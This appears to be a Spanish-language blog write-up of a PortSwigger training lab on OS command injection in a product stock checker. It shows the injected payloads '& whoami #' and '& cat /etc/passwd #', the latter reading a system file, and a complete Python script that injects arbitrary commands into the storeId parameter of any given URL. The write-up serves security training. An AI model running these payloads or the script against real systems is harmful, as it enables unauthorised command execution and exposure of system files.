---
title: "01 OS command injection, simple case"
collection: publications
category: portswigger
permalink: publications/Command Injection/01_OS command injection, simple case
excerpt: 'Este laboratorio contiene una vulnerabilidad de inyección de comandos del sistema operativo en el comprobador de existencias de productos. La aplicación ejecuta un comando shell que contiene los ID de producto y tienda proporcionados por el usuario, y devuelve la salida sin procesar del comando en su respuesta.'
date: 2024-12-08
#venue: 'Journal 1'
#slidesurl: 'http://academicpages.github.io/files/slides1.pdf'
#paperurl: 'http://academicpages.github.io/files/paper1.pdf'
citation: 'OS command injection, simple case'
---

![logo]({{site.url}}/images/Command Injection/command-lab-1/logo.png)

## Descripción del laboratorio

![Descripción]({{site.url}}/images/Command Injection/command-lab-1/descripcion.png)

## Objetivo del laboratorio

Para resolver el laboratorio, ejecutamos el comando whoami para determinar el nombre del usuario actual.

## Analisis

Como la descripcion del problema nos indica, es vulnerableal comprobador de existencias del producto. Vamos a analizar esta entrada para realizar la vulneración.

![Conf1]({{site.url}}/images/Command Injection/command-lab-1/conf1.png)

Para resolver el laboratorio debemos ejecutar el whoami y debemos realizar el url encode con `Ctrl + u` y vemos que obtenemos el usuario.

```python
& whoami #
```

![Conf2]({{site.url}}/images/Command Injection/command-lab-1/conf2.png)

## Aprobado

![Aprobado]({{site.url}}/images/Command Injection/command-lab-1/aprobado.png)

## Obtenemos el Passwd

Para ver que tan peligroso es hacer este tipo de ataque, vemos que puedo ejecutar comandos del sistema.

```python
& cat /etc/passwd #
```

![Conf3]({{site.url}}/images/Command Injection/command-lab-1/conf3.png)

# Codigo Python

```python
import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def run_command(url, command):
    stock_path = '/product/stock'
    command_injection = '1 & ' + command
    params = {'productId': '1', 'storeId': command_injection}
    r = requests.post(url + stock_path, data=params, verify=False, proxies=proxies)
    if (len(r.text) > 3):
        print("(+) Command injection successful!")
        print("(+) Output of command: " + r.text)
    else:
        print("(-) Command injection failed.")

def main():
    if len(sys.argv) != 3:
        print("(+) Usage: %s <url> <command>" % sys.argv[0])
        print("(+) Example: %s www.example.com whoami" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    command = sys.argv[2]
    print("(+) Exploiting command injection...")
    run_command(url, command)

if __name__ == "__main__":
    main()
```